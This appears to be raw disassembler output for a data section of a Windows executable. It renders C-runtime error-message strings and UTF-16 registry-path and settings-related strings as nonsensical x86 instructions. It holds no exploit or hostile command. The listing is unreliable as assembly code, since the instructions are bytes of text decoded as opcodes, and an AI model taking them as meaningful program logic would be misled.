  401da2:	imul   eax,DWORD PTR [eax],0x6e
  401da5:	outs   dx,DWORD PTR ds:[esi]
  401da6:	and    BYTE PTR [ebp+0x65],ch
  401da9:	jae    0x401e1e
  401dab:	popa   
  401dac:	and    BYTE PTR gs:[bx+di+0x76],ah
  401db1:	popa   
  401db2:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x656c
  401dba:	add    BYTE PTR [eax],al
  401dbc:	outs   dx,BYTE PTR ds:[esi]
  401dbd:	outs   dx,DWORD PTR ds:[esi]
  401dbe:	and    BYTE PTR [ebp+0x65],ch
  401dc1:	jae    0x401e36
  401dc3:	popa   
  401dc4:	add    BYTE PTR gs:[bx+si],al
  401dc8:	outs   dx,BYTE PTR ds:[esi]
  401dc9:	outs   dx,DWORD PTR ds:[esi]
  401dca:	and    BYTE PTR [eax+0x72],dh
  401dcd:	outs   dx,DWORD PTR ds:[esi]
  401dce:	je     0x401e3f
  401dd0:	arpl   WORD PTR [edi+0x6c],bp
  401dd3:	and    BYTE PTR [edi+0x70],ch
  401dd6:	je     0x401e41
  401dd8:	outs   dx,DWORD PTR ds:[esi]
  401dd9:	outs   dx,BYTE PTR ds:[esi]
  401dda:	add    BYTE PTR [eax],al
  401ddc:	outs   dx,BYTE PTR ds:[esi]
  401ddd:	outs   dx,DWORD PTR ds:[esi]
  401dde:	and    BYTE PTR [ebx+0x74],dh
  401de1:	jb     0x401e48
  401de3:	popa   
  401de4:	ins    DWORD PTR es:[edi],dx
  401de5:	and    BYTE PTR [edx+0x65],dh
  401de8:	jae    0x401e59
  401dea:	jne    0x401e5e
  401dec:	arpl   WORD PTR [ebp+0x73],sp
  401def:	add    BYTE PTR [esi+0x6f],ch
  401df2:	and    BYTE PTR [ebx+0x75],dh
  401df5:	arpl   WORD PTR [eax+0x20],bp
  401df8:	fs gs jbe 0x401e65
  401dfc:	arpl   WORD PTR [ebp+0x20],sp
  401dff:	outs   dx,DWORD PTR ds:[esi]
  401e00:	jb     0x401e22
  401e02:	popa   
  401e03:	fs fs jb 0x401e6c
  401e07:	jae    0x401e7c
  401e09:	add    BYTE PTR [eax],al
  401e0b:	add    BYTE PTR [esi+0x6f],ch
  401e0e:	and    BYTE PTR [ebx+0x75],dh
  401e11:	arpl   WORD PTR [eax+0x20],bp
  401e14:	jo     0x401e88
  401e16:	outs   dx,DWORD PTR ds:[esi]
  401e17:	arpl   WORD PTR [ebp+0x73],sp
  401e1a:	jae    0x401e1c
  401e1c:	outs   dx,BYTE PTR ds:[esi]
  401e1d:	outs   dx,DWORD PTR ds:[esi]
  401e1e:	je     0x401e40
  401e20:	popa   
  401e21:	and    BYTE PTR [ecx+ebp*2+0x72],ah
  401e25:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  401e2a:	jns    0x401e2c
  401e2c:	outs   dx,BYTE PTR ds:[esi]
  401e2d:	outs   dx,DWORD PTR ds:[esi]
  401e2e:	je     0x401e50
  401e30:	popa   
  401e31:	and    BYTE PTR [ebx+0x6f],dh
  401e34:	arpl   WORD PTR [ebx+0x65],bp
  401e37:	je     0x401e39
  401e39:	add    BYTE PTR [eax],al
  401e3b:	add    BYTE PTR [esi+0x6f],ch
  401e3e:	je     0x401e60
  401e40:	popa   
  401e41:	and    BYTE PTR [ebx+0x74],dh
  401e44:	jb     0x401eab
  401e46:	popa   
  401e47:	ins    DWORD PTR es:[edi],dx
  401e48:	add    BYTE PTR [eax],al
  401e4a:	add    BYTE PTR [eax],al
  401e4c:	outs   dx,BYTE PTR ds:[esi]
  401e4d:	outs   dx,DWORD PTR ds:[esi]
  401e4e:	je     0x401e70
  401e50:	arpl   WORD PTR [edi+0x6e],bp
  401e53:	outs   dx,BYTE PTR ds:[esi]
  401e54:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  401e59:	add    BYTE PTR [eax],al
  401e5b:	add    BYTE PTR [esi+0x6f],ch
  401e5e:	je     0x401e80
  401e60:	jae    0x401ed7
  401e62:	jo     0x401ed4
  401e64:	outs   dx,DWORD PTR ds:[esi]
  401e65:	jb     0x401edb
  401e67:	gs add BYTE PTR fs:[eax],al
  401e6b:	add    BYTE PTR [edi+0x70],ch
  401e6e:	gs jb  0x401ed2
  401e71:	je     0x401edc
  401e73:	outs   dx,DWORD PTR ds:[esi]
  401e74:	outs   dx,BYTE PTR ds:[esi]
  401e75:	and    BYTE PTR [ecx+0x6e],ch
  401e78:	and    BYTE PTR [eax+0x72],dh
  401e7b:	outs   dx,DWORD PTR ds:[esi]
  401e7c:	addr16 jb 0x401ee4
  401e7f:	jae    0x401ef4
  401e81:	add    BYTE PTR [eax],al
  401e83:	add    BYTE PTR [edi+0x70],ch
  401e86:	gs jb  0x401eea
  401e89:	je     0x401ef4
  401e8b:	outs   dx,DWORD PTR ds:[esi]
  401e8c:	outs   dx,BYTE PTR ds:[esi]
  401e8d:	and    BYTE PTR [esi+0x6f],ch
  401e90:	je     0x401eb2
  401e92:	jo     0x401ef9
  401e94:	jb     0x401f03
  401e96:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x706f0064
  401e9e:	gs jb  0x401f02
  401ea1:	je     0x401f0c
  401ea3:	outs   dx,DWORD PTR ds:[esi]
  401ea4:	outs   dx,BYTE PTR ds:[esi]
  401ea5:	and    BYTE PTR [esi+0x6f],ch
  401ea8:	je     0x401eca
  401eaa:	jae    0x401f21
  401eac:	jo     0x401f1e
  401eae:	outs   dx,DWORD PTR ds:[esi]
  401eaf:	jb     0x401f25
  401eb1:	gs add BYTE PTR fs:[edi+0x70],ch
  401eb6:	gs jb  0x401f1a
  401eb9:	je     0x401f24
  401ebb:	outs   dx,DWORD PTR ds:[esi]
  401ebc:	outs   dx,BYTE PTR ds:[esi]
  401ebd:	and    BYTE PTR [edi+0x6f],dh
  401ec0:	jne    0x401f2e
  401ec2:	and    BYTE PTR fs:[edx+0x6c],ah
  401ec6:	outs   dx,DWORD PTR ds:[esi]
  401ec7:	arpl   WORD PTR [ebx+0x0],bp
  401eca:	add    BYTE PTR [eax],al
  401ecc:	outs   dx,DWORD PTR ds:[esi]
  401ecd:	ja     0x401f3d
  401ecf:	gs jb  0x401ef2
  401ed2:	fs gs popa 
  401ed5:	add    BYTE PTR fs:[eax],al
  401ed8:	jo     0x401f4c
  401eda:	outs   dx,DWORD PTR ds:[esi]
  401edb:	je     0x401f4c
  401edd:	arpl   WORD PTR [edi+0x6c],bp
  401ee0:	and    BYTE PTR [ebp+0x72],ah
  401ee3:	jb     0x401f54
  401ee5:	jb     0x401ee7
  401ee7:	add    BYTE PTR [eax+0x72],dh
  401eea:	outs   dx,DWORD PTR ds:[esi]
  401eeb:	je     0x401f5c
  401eed:	arpl   WORD PTR [edi+0x6c],bp
  401ef0:	and    BYTE PTR [esi+0x6f],ch
  401ef3:	je     0x401f15
  401ef5:	jae    0x401f6c
  401ef7:	jo     0x401f69
  401ef9:	outs   dx,DWORD PTR ds:[esi]
  401efa:	jb     0x401f70
  401efc:	gs add BYTE PTR fs:[eax],al
  401f00:	jb     0x401f67
  401f02:	popa   
  401f03:	and    BYTE PTR fs:[edi+0x6e],ch
  401f07:	ins    BYTE PTR es:[edi],dx
  401f08:	jns    0x401f2a
  401f0a:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x7973
  401f11:	jae    0x401f87
  401f13:	gs ins DWORD PTR es:[edi],dx
  401f15:	add    BYTE PTR [eax],al
  401f17:	add    BYTE PTR [edx+0x65],dh
  401f1a:	jae    0x401f8b
  401f1c:	jne    0x401f90
  401f1e:	arpl   WORD PTR [ebp+0x20],sp
  401f21:	fs gs popa 
  401f24:	fs ins BYTE PTR es:[edi],dx
  401f26:	outs   dx,DWORD PTR ds:[esi]
  401f27:	arpl   WORD PTR [ebx+0x20],bp
  401f2a:	ja     0x401f9b
  401f2c:	jne    0x401f9a
  401f2e:	and    BYTE PTR fs:[edi+0x63],ch
  401f32:	arpl   WORD PTR [ebp+0x72],si
  401f35:	add    BYTE PTR [eax],al
  401f37:	add    BYTE PTR [edx+0x65],dh
  401f3a:	jae    0x401fb1
  401f3c:	ins    BYTE PTR es:[edi],dx
  401f3d:	je     0x401f5f
  401f3f:	outs   dx,DWORD PTR ds:[esi]
  401f40:	jne    0x401fb6
  401f42:	and    BYTE PTR [edi+0x66],ch
  401f45:	and    BYTE PTR [edx+0x61],dh
  401f48:	outs   dx,BYTE PTR ds:[esi]
  401f49:	add    BYTE PTR gs:[bp+di+0x74],dh
  401f4e:	popa   
  401f4f:	je     0x401fb6
  401f51:	and    BYTE PTR [esi+0x6f],ch
  401f54:	je     0x401f76
  401f56:	jb     0x401fbd
  401f58:	arpl   WORD PTR [edi+0x76],bp
  401f5b:	gs jb  0x401fbf
  401f5e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  401f62:	add    BYTE PTR [eax],al
  401f64:	jae    0x401fda
  401f66:	jb     0x401fcd
  401f68:	popa   
  401f69:	ins    DWORD PTR es:[edi],dx
  401f6a:	and    BYTE PTR [ecx+ebp*2+0x6d],dh
  401f6e:	outs   dx,DWORD PTR gs:[esi]
  401f70:	jne    0x401fe6
  401f72:	add    BYTE PTR [eax],al
  401f74:	je     0x401fdb
  401f76:	js     0x401fec
  401f78:	and    BYTE PTR [esi+0x69],ah
  401f7b:	ins    BYTE PTR es:[edi],dx
  401f7c:	and    BYTE PTR gs:[edx+0x75],ah
  401f80:	jae    0x401ffb
  401f82:	add    BYTE PTR [eax],al
  401f84:	je     0x401fef
  401f86:	ins    DWORD PTR es:[edi],dx
  401f87:	gs and BYTE PTR fs:[edi+0x75],ch
  401f8c:	je     0x401f8e
  401f8e:	add    BYTE PTR [eax],al
  401f90:	je     0x402001
  401f92:	outs   dx,DWORD PTR ds:[esi]
  401f93:	and    BYTE PTR [ebp+0x61],ch
  401f96:	outs   dx,BYTE PTR ds:[esi]
  401f97:	jns    0x401fb9
  401f99:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6f20
  401fa0:	jo     0x402007
  401fa2:	outs   dx,BYTE PTR ds:[esi]
  401fa3:	and    BYTE PTR [ecx+0x6e],ch
  401fa6:	and    BYTE PTR [ebx+0x79],dh
  401fa9:	jae    0x40201f
  401fab:	gs ins DWORD PTR es:[edi],dx
  401fad:	add    BYTE PTR [eax],al
  401faf:	add    BYTE PTR [edi+ebp*2+0x6f],dh
  401fb3:	and    BYTE PTR [ebp+0x61],ch
  401fb6:	outs   dx,BYTE PTR ds:[esi]
  401fb7:	jns    0x401fd9
  401fb9:	ins    BYTE PTR es:[edi],dx
  401fba:	imul   ebp,DWORD PTR [esi+0x6b],0x74000073
  401fc1:	outs   dx,DWORD PTR ds:[esi]
  401fc2:	outs   dx,DWORD PTR ds:[esi]
  401fc3:	and    BYTE PTR [ebp+0x61],ch
  401fc6:	outs   dx,BYTE PTR ds:[esi]
  401fc7:	jns    0x401fe9
  401fc9:	jae    0x402044
  401fcb:	ins    DWORD PTR es:[edi],dx
  401fcc:	bound  ebp,QWORD PTR [edi+0x6c]
  401fcf:	imul   esp,DWORD PTR [ebx+0x20],0x6b6e696c
  401fd6:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  401fda:	gs ins BYTE PTR es:[edi],dx
  401fdc:	jae    0x401fde
  401fde:	add    BYTE PTR [eax],al
  401fe0:	jbe    0x402043
  401fe2:	ins    BYTE PTR es:[edi],dx
  401fe3:	jne    0x40204a
  401fe5:	and    BYTE PTR [edi+ebp*2+0x6f],dh
  401fe9:	and    BYTE PTR [ecx+eiz*2+0x72],ch
  401fed:	add    BYTE PTR gs:[bx+0x72],dh
  401ff2:	outs   dx,DWORD PTR ds:[esi]
  401ff3:	outs   dx,BYTE PTR ds:[esi]
  401ff4:	and    BYTE PTR [bx+si+0x72],dh
  401ff8:	outs   dx,DWORD PTR ds:[esi]
  401ff9:	je     0x40206a
  401ffb:	arpl   WORD PTR [edi+0x6c],bp
  401ffe:	and    BYTE PTR [ecx+edi*2+0x70],dh
  402002:	add    BYTE PTR gs:[eax],dl
  402005:	jo     0x402047
  402007:	add    BYTE PTR [esi+0x16],al
  40200a:	add    BYTE PTR [eax],dl
  40200c:	add    al,0x0
	...
  402016:	add    BYTE PTR [eax+0x1040302],al
  40201c:	add    al,0x5
  40201e:	add    eax,DWORD PTR [edx]
  402020:	add    al,0x4
  402022:	add    al,0x4
  402024:	add    al,0x4
  402026:	add    al,0x0
  402028:	push   eax
  402029:	push   ss
  40202a:	add    BYTE PTR [eax],dl
  40202c:	add    al,0x0
	...
  402036:	add    BYTE PTR [eax+0x10001647],al
  40203c:	add    al,0x0
	...
  402046:	add    BYTE PTR [eax+0x12001c18],al
  40204c:	add    al,0x2
  40204e:	pop    ss
  40204f:	sbb    al,0x8
  402051:	add    BYTE PTR [eax],al
  402053:	add    BYTE PTR [eax],al
  402055:	add    BYTE PTR [eax],al
  402057:	and    BYTE PTR [ecx+0x16],cl
  40205a:	add    BYTE PTR [eax],dl
  40205c:	add    al,0x0
	...
  402066:	add    BYTE PTR [eax+0x10001645],al
  40206c:	add    al,0x0
	...
  402076:	add    BYTE PTR [eax+0x0],al
  40207c:	add    BYTE PTR [eax],al
  40207e:	add    BYTE PTR [eax+0x0],al
  402084:	add    BYTE PTR [eax],al
  402086:	add    BYTE PTR [eax+0x0],al
  40208c:	add    BYTE PTR [eax],al
  40208e:	add    BYTE PTR [eax+0x0],al
  402094:	add    BYTE PTR [eax],al
  402096:	add    BYTE PTR [eax+0x0],al
  40209c:	add    BYTE PTR [eax],al
  40209e:	add    BYTE PTR [eax+0x0],al
  4020a1:	add    BYTE PTR [eax],al
  4020a3:	add    BYTE PTR [eax],al
  4020a5:	add    BYTE PTR [eax],al
  4020a7:	inc    eax
  4020a8:	add    BYTE PTR [eax],al
  4020aa:	add    BYTE PTR [eax],al
  4020ac:	add    BYTE PTR [eax],al
  4020ae:	add    BYTE PTR [eax+0x0],al
  4020b1:	add    BYTE PTR [eax],al
  4020b3:	add    BYTE PTR [eax],al
  4020b5:	add    BYTE PTR [eax],al
  4020b7:	inc    eax
  4020b8:	add    DWORD PTR [eax],eax
  4020ba:	add    BYTE PTR [eax],al
  4020bc:	add    BYTE PTR [eax],al
  4020be:	add    BYTE PTR [eax],ah
  4020c0:	add    BYTE PTR [eax],al
  4020c2:	add    BYTE PTR [eax],al
  4020c4:	add    BYTE PTR [eax],al
  4020c6:	add    BYTE PTR [eax],ah
  4020c8:	add    al,BYTE PTR [eax]
  4020ca:	add    BYTE PTR [eax],al
  4020cc:	add    BYTE PTR [eax],al
  4020ce:	add    BYTE PTR [eax],ah
  4020d0:	add    al,0x0
  4020d2:	add    BYTE PTR [eax],al
  4020d4:	add    BYTE PTR [eax],al
  4020d6:	add    BYTE PTR [eax],ah
  4020d8:	or     BYTE PTR [eax],al
  4020da:	add    BYTE PTR [eax],al
  4020dc:	add    BYTE PTR [eax],al
  4020de:	add    BYTE PTR [eax],ah
  4020e0:	and    BYTE PTR [eax],al
  4020e2:	add    BYTE PTR [eax],al
  4020e4:	add    BYTE PTR [eax],al
  4020e6:	add    DWORD PTR [eax],esp
  4020e8:	inc    eax
  4020e9:	add    BYTE PTR [eax],al
  4020eb:	add    BYTE PTR [eax],al
  4020ed:	add    BYTE PTR [eax],al
  4020ef:	and    BYTE PTR [eax+0x16],cl
  4020f2:	add    BYTE PTR [eax],dl
  4020f4:	add    al,0x0
	...
  4020fe:	add    BYTE PTR [eax-0x7c2917c5],al
  402104:	or     edx,DWORD PTR [eax+0x359848a3]
  40210a:	push   edi
  40210b:	imul   ebp,DWORD PTR gs:[edi+0x64],0x74
  402110:	dec    edi
  402111:	push   ss
  402112:	add    BYTE PTR [eax],dl
  402114:	add    al,0x0
	...
  40211e:	add    BYTE PTR [eax+0x0],al
  402124:	add    BYTE PTR [eax],al
  402126:	add    BYTE PTR [eax],al
  402128:	push   cs
  402129:	sbb    al,0x0
  40212b:	adc    al,BYTE PTR [edx+eax*1]
  40212e:	or     eax,0x41c
  402133:	add    BYTE PTR [eax],al
  402135:	add    BYTE PTR [eax],al
  402137:	and    al,al
  402139:	inc    edx
  40213a:	inc    eax
  40213b:	add    BYTE PTR [eax+0x4000403d],ah
  402141:	inc    ebx
  402142:	inc    eax
  402143:	add    BYTE PTR [eax+0x7000405d],dh
  402149:	ds inc eax
  40214b:	add    al,al
  40214d:	inc    edx
  40214e:	inc    eax
  40214f:	add    BYTE PTR [eax+0x4000403d],ah
  402155:	inc    ebx
  402156:	inc    eax
  402157:	add    BYTE PTR [eax],ah
  402159:	inc    edx
  40215a:	inc    eax
  40215b:	add    BYTE PTR [eax+0x3e],dh
  40215e:	inc    eax
  40215f:	add    BYTE PTR [eax],ah
  402161:	cmp    eax,0x3da00040
  402166:	inc    eax
  402167:	add    al,al
  402169:	cmp    eax,0x5db00040
  40216e:	inc    eax
  40216f:	add    BYTE PTR [eax-0x4fffbfa3],dh
  402175:	pop    ebp
  402176:	inc    eax
  402177:	add    BYTE PTR [eax+0x3e],dh
  40217a:	inc    eax
  40217b:	add    BYTE PTR [eax],ah
  40217d:	cmp    eax,0x3da00040
  402182:	inc    eax
  402183:	add    al,al
  402185:	cmp    eax,0x2ec00040
  40218a:	inc    eax
  40218b:	add    BYTE PTR [eax],dh
  40218d:	das    
  40218e:	inc    eax
  40218f:	add    BYTE PTR [eax+0x2f],dl
  402192:	inc    eax
  402193:	add    BYTE PTR [eax+0x2000402f],ah
  402199:	cs inc eax
  40219b:	add    BYTE PTR [eax+0x47],dh
  40219e:	inc    eax
  40219f:	add    BYTE PTR [eax],dh
  4021a1:	cs inc eax
  4021a3:	add    BYTE PTR [eax+0x2e],al
  4021a6:	inc    eax
  4021a7:	add    BYTE PTR [eax+0x2e],dl
  4021aa:	inc    eax
  4021ab:	add    BYTE PTR [eax+0x2e],dl
  4021ae:	inc    eax
  4021af:	add    BYTE PTR [eax],ah
  4021b1:	cs inc eax
  4021b3:	add    BYTE PTR [eax],ah
  4021b5:	cs inc eax
  4021b7:	add    BYTE PTR [eax],dh
  4021b9:	cs inc eax
  4021bb:	add    BYTE PTR [eax+0x2e],al
  4021be:	inc    eax
  4021bf:	add    BYTE PTR [eax+0x2e],dl
  4021c2:	inc    eax
  4021c3:	add    al,ah
  4021c5:	das    
  4021c6:	inc    eax
  4021c7:	add    BYTE PTR [ebx+0x0],al
  4021ca:	ins    BYTE PTR es:[edi],dx
  4021cb:	add    BYTE PTR [edi+0x0],ch
  4021ce:	jne    0x4021d0
  4021d0:	add    BYTE PTR fs:[ebx+0x0],dl
  4021d4:	jns    0x4021d6
  4021d6:	jae    0x4021d8
  4021d8:	je     0x4021da
  4021da:	add    BYTE PTR gs:[ebp+0x0],ch
  4021de:	inc    esp
  4021df:	add    BYTE PTR [ecx+0x0],ch
  4021e2:	popa   
  4021e3:	add    BYTE PTR [eax+eax*1+0x6f],ch
  4021e7:	add    BYTE PTR [edi+0x0],ah
  4021ea:	add    BYTE PTR [eax],al
  4021ec:	dec    esi
  4021ed:	add    BYTE PTR [edi+0x0],ch
  4021f0:	dec    esp
  4021f1:	add    BYTE PTR [edi+0x0],ch
  4021f4:	ja     0x4021f6
  4021f6:	inc    esp
  4021f7:	add    BYTE PTR [ecx+0x0],ch
  4021fa:	jae    0x4021fc
  4021fc:	imul   eax,DWORD PTR [eax],0x53
  4021ff:	add    BYTE PTR [eax+0x0],dh
  402202:	popa   
  402203:	add    BYTE PTR [ebx+0x0],ah
  402206:	add    BYTE PTR gs:[ebx+0x0],al
  40220a:	push   0x63006500
  40220f:	add    BYTE PTR [ebx+0x0],ch
  402212:	jae    0x402214
  402214:	add    BYTE PTR [eax],al
  402216:	add    BYTE PTR [eax],al
  402218:	push   ebx
  402219:	add    BYTE PTR [edi+0x0],ch
  40221c:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  402221:	add    BYTE PTR [ecx+0x0],ah
  402224:	jb     0x402226
  402226:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40222b:	add    BYTE PTR [ecx+0x0],ch
  40222e:	arpl   WORD PTR [eax],ax
  402230:	jb     0x402232
  402232:	outs   dx,DWORD PTR ds:[esi]
  402233:	add    BYTE PTR [ebx+0x0],dh
  402236:	outs   dx,DWORD PTR ds:[esi]
  402237:	add    BYTE PTR [esi+0x0],ah
  40223a:	je     0x40223c
  40223c:	pop    esp
  40223d:	add    BYTE PTR [edi+0x0],dl
  402240:	imul   eax,DWORD PTR [eax],0x64006e
  402246:	outs   dx,DWORD PTR ds:[esi]
  402247:	add    BYTE PTR [edi+0x0],dh
  40224a:	jae    0x40224c
  40224c:	pop    esp
  40224d:	add    BYTE PTR [ebx+0x0],al
  402250:	jne    0x402252
  402252:	jb     0x402254
  402254:	jb     0x402256
  402256:	add    BYTE PTR gs:[esi+0x0],ch
  40225a:	je     0x40225c
  40225c:	push   esi
  40225d:	add    BYTE PTR [ebp+0x0],ah
  402260:	jb     0x402262
  402262:	jae    0x402264
  402264:	imul   eax,DWORD PTR [eax],0x6e006f
  40226a:	pop    esp
  40226b:	add    BYTE PTR [eax+0x0],dl
  40226e:	outs   dx,DWORD PTR ds:[esi]
  40226f:	add    BYTE PTR [eax+eax*1+0x69],ch
  402273:	add    BYTE PTR [ebx+0x0],ah
  402276:	imul   eax,DWORD PTR [eax],0x730065
  40227c:	pop    esp
  40227d:	add    BYTE PTR [ebp+0x0],al
  402280:	js     0x402282
  402282:	jo     0x402284
  402284:	ins    BYTE PTR es:[edi],dx
  402285:	add    BYTE PTR [edi+0x0],ch
  402288:	jb     0x40228a
  40228a:	add    BYTE PTR gs:[edx+0x0],dh
  40228e:	add    BYTE PTR [eax],al
  402290:	jo     0x402292
  402292:	popa   
  402293:	add    BYTE PTR [edi+0x0],ah
  402296:	add    BYTE PTR gs:0x65005300,bh
  40229d:	add    BYTE PTR [eax+eax*1+0x74],dh
  4022a1:	add    BYTE PTR [ecx+0x0],ch
  4022a4:	outs   dx,BYTE PTR ds:[esi]
  4022a5:	add    BYTE PTR [edi+0x0],ah
  4022a8:	jae    0x4022aa
  4022aa:	push   eax
  4022ab:	add    BYTE PTR [ecx+0x0],ah
  4022ae:	add    BYTE PTR [di+0x0],ah
  4022b2:	dec    edi
  4022b3:	add    BYTE PTR [esi+0x0],ch
  4022b6:	add    BYTE PTR gs:[eax+eax*1+0x72],al
  4022bb:	add    BYTE PTR [ecx+0x0],ch
  4022be:	jbe    0x4022c0
  4022c0:	add    BYTE PTR gs:[ebx+0x0],dl
  4022c4:	je     0x4022c6
  4022c6:	outs   dx,DWORD PTR ds:[esi]
  4022c7:	add    BYTE PTR [edx+0x0],dh
  4022ca:	popa   
  4022cb:	add    BYTE PTR [edi+0x0],ah
  4022ce:	add    BYTE PTR gs:[eax],al
  4022d1:	add    BYTE PTR [eax],al
  4022d3:	add    BYTE PTR [eax],al
  4022d5:	add    BYTE PTR [eax],al
  4022d7:	add    BYTE PTR [edi+0x0],dh
  4022da:	imul   eax,DWORD PTR [eax],0x64006e
  4022e0:	outs   dx,DWORD PTR ds:[esi]
  4022e1:	add    BYTE PTR [edi+0x0],dh
  4022e4:	jae    0x4022e6
  4022e6:	add    BYTE PTR cs:[ecx+0x0],ch
  4022ea:	ins    DWORD PTR es:[edi],dx
  4022eb:	add    BYTE PTR [ebp+0x0],ch
  4022ee:	add    BYTE PTR gs:[edx+0x0],dh
  4022f2:	jae    0x4022f4
  4022f4:	imul   eax,DWORD PTR [eax],0x650076
  4022fa:	arpl   WORD PTR [eax],ax
  4022fc:	outs   dx,DWORD PTR ds:[esi]
  4022fd:	add    BYTE PTR [esi+0x0],ch
  402300:	je     0x402302
  402302:	jb     0x402304
  402304:	outs   dx,DWORD PTR ds:[esi]
  402305:	add    BYTE PTR [eax+eax*1+0x70],ch
  402309:	add    BYTE PTR [ecx+0x0],ah
  40230c:	outs   dx,BYTE PTR ds:[esi]
  40230d:	add    BYTE PTR [ebp+0x0],ah
  402310:	ins    BYTE PTR es:[edi],dx
  402311:	add    BYTE PTR [edi+0x0],bl
  402314:	arpl   WORD PTR [eax],ax
  402316:	ja     0x402318
  402318:	xor    eax,0x31006e00
  40231d:	add    BYTE PTR [eax+0x0],ch
  402320:	xor    al,BYTE PTR [eax]
  402322:	je     0x402324
  402324:	js     0x402326
  402326:	jns    0x402328
  402328:	add    BYTE PTR gs:[edi+0x0],dh
  40232c:	jns    0x40232e
  40232e:	and    DWORD PTR [eax],eax
  402330:	ins    DWORD PTR es:[edi],dx
  402331:	add    BYTE PTR [ecx+0x0],ch
  402334:	arpl   WORD PTR [eax],ax
  402336:	jb     0x402338
  402338:	outs   dx,DWORD PTR ds:[esi]
  402339:	add    BYTE PTR [ebx+0x0],dh
  40233c:	outs   dx,DWORD PTR ds:[esi]
  40233d:	add    BYTE PTR [esi+0x0],ah
  402340:	je     0x402342
  402342:	add    BYTE PTR cs:[edi+0x0],dh
  402346:	imul   eax,DWORD PTR [eax],0x64006e
  40234c:	outs   dx,DWORD PTR ds:[esi]
  40234d:	add    BYTE PTR [edi+0x0],dh
  402350:	jae    0x402352
  402352:	add    BYTE PTR cs:[ecx+0x0],ch
  402356:	ins    DWORD PTR es:[edi],dx
  402357:	add    BYTE PTR [ebp+0x0],ch
  40235a:	add    BYTE PTR gs:[edx+0x0],dh
  40235e:	jae    0x402360
  402360:	imul   eax,DWORD PTR [eax],0x650076
  402366:	arpl   WORD PTR [eax],ax
  402368:	outs   dx,DWORD PTR ds:[esi]
  402369:	add    BYTE PTR [esi+0x0],ch
  40236c:	je     0x40236e
  40236e:	jb     0x402370
  402370:	outs   dx,DWORD PTR ds:[esi]
  402371:	add    BYTE PTR [eax+eax*1+0x70],ch
  402375:	add    BYTE PTR [ecx+0x0],ah
  402378:	outs   dx,BYTE PTR ds:[esi]
  402379:	add    BYTE PTR [ebp+0x0],ah
  40237c:	ins    BYTE PTR es:[edi],dx
  40237d:	add    BYTE PTR [eax],al
  40237f:	add    BYTE PTR [esi+0x0],cl
  402382:	jne    0x402384
  402384:	ins    DWORD PTR es:[edi],dx
  402385:	add    BYTE PTR [edx+0x0],ah
  402388:	add    BYTE PTR gs:[edx+0x0],dh
  40238c:	dec    edi
  40238d:	add    BYTE PTR [esi+0x0],ah
  402390:	inc    esp
  402391:	add    BYTE PTR [ecx+0x0],ch
  402394:	popa   
  402395:	add    BYTE PTR [eax+eax*1+0x6f],ch
  402399:	add    BYTE PTR [edi+0x0],ah
  40239c:	jae    0x40239e
  40239e:	add    BYTE PTR [eax],al
  4023a0:	push   ebx
  4023a1:	add    BYTE PTR [edi+0x0],ch
  4023a4:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  4023a9:	add    BYTE PTR [ecx+0x0],ah
  4023ac:	jb     0x4023ae
  4023ae:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  4023b3:	add    BYTE PTR [ecx+0x0],ch
  4023b6:	arpl   WORD PTR [eax],ax
  4023b8:	jb     0x4023ba
  4023ba:	outs   dx,DWORD PTR ds:[esi]
  4023bb:	add    BYTE PTR [ebx+0x0],dh
  4023be:	outs   dx,DWORD PTR ds:[esi]
  4023bf:	add    BYTE PTR [esi+0x0],ah
  4023c2:	je     0x4023c4
  4023c4:	pop    esp
  4023c5:	add    BYTE PTR [edi+0x0],dl
  4023c8:	imul   eax,DWORD PTR [eax],0x64006e
  4023ce:	outs   dx,DWORD PTR ds:[esi]
  4023cf:	add    BYTE PTR [edi+0x0],dh
  4023d2:	jae    0x4023d4
  4023d4:	pop    esp
  4023d5:	add    BYTE PTR [ebx+0x0],al
  4023d8:	jne    0x4023da
  4023da:	jb     0x4023dc
  4023dc:	jb     0x4023de
  4023de:	add    BYTE PTR gs:[esi+0x0],ch
  4023e2:	je     0x4023e4
  4023e4:	push   esi
  4023e5:	add    BYTE PTR [ebp+0x0],ah
  4023e8:	jb     0x4023ea
  4023ea:	jae    0x4023ec
  4023ec:	imul   eax,DWORD PTR [eax],0x6e006f
  4023f2:	pop    esp
  4023f3:	add    BYTE PTR [ebx+0x0],dl
  4023f6:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  4023fb:	add    BYTE PTR [ecx+0x0],ch
  4023fe:	outs   dx,BYTE PTR ds:[esi]
  4023ff:	add    BYTE PTR [edi+0x0],ah
  402402:	push   ebx
  402403:	add    BYTE PTR [ecx+0x0],bh
  402406:	outs   dx,BYTE PTR ds:[esi]
  402407:	add    BYTE PTR [ebx+0x0],ah
  40240a:	pop    esp
  40240b:	add    BYTE PTR [ebx+0x0],dl
  40240e:	jns    0x402410
  402410:	outs   dx,BYTE PTR ds:[esi]
  402411:	add    BYTE PTR [ebx+0x0],ah
  402414:	inc    esp
  402415:	add    BYTE PTR [ecx+0x0],ah
  402418:	je     0x40241a
  40241a:	popa   
  40241b:	add    BYTE PTR [eax],al
  40241d:	add    BYTE PTR [eax],al
  40241f:	add    BYTE PTR [ebp+0x0],ch
  402422:	popa   
  402423:	add    BYTE PTR [eax+0x0],bh
  402426:	inc    ebp
  402427:	add    BYTE PTR [eax+0x0],bh
  40242a:	arpl   WORD PTR [eax],ax
  40242c:	add    BYTE PTR gs:[ebp+0x0],ah
  402430:	add    BYTE PTR fs:[ebp+0x0],ah
  402434:	add    BYTE PTR fs:[eax+eax*1+0x69],al
  402439:	add    BYTE PTR [ecx+0x0],ah
  40243c:	ins    BYTE PTR es:[edi],dx
  40243d:	add    BYTE PTR [edi+0x0],ch
  402440:	add    BYTE PTR [bp+di+0x0],dh
  402444:	inc    ebx
  402445:	add    BYTE PTR [edi+0x0],ch
  402448:	jne    0x40244a
  40244a:	outs   dx,BYTE PTR ds:[esi]
  40244b:	add    BYTE PTR [eax+eax*1+0x0],dh
